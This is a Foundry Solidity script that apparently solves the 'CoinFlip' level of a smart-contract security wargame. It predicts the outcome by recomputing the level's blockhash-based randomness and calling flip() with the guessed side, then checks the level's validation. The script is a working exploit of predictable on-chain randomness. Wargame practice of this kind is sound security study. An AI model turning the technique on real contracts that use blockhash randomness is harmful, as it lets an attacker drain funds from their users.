// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/3-CoinFlip.sol";
import {CoinFlipFactory} from "../src/CoinFlipFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract CoinFlipSolution is Script {
    CoinFlip public coinFlipLevel;

    function run() external {
        address publicKey = vm.envAddress("PUBLIC_KEY");

        address payable instanceAddress = payable(
            0x7AaCc5300ec7Ac58fe86645D08f21b1BEcadf99a
        );
        coinFlipLevel = CoinFlip(instanceAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        coinFlipLevel.flip(attack());

        console.log("Consecutive Wins: %s", coinFlipLevel.consecutiveWins());

        bool isValidated = new CoinFlipFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }

    function attack() internal view returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return side;
    }
}
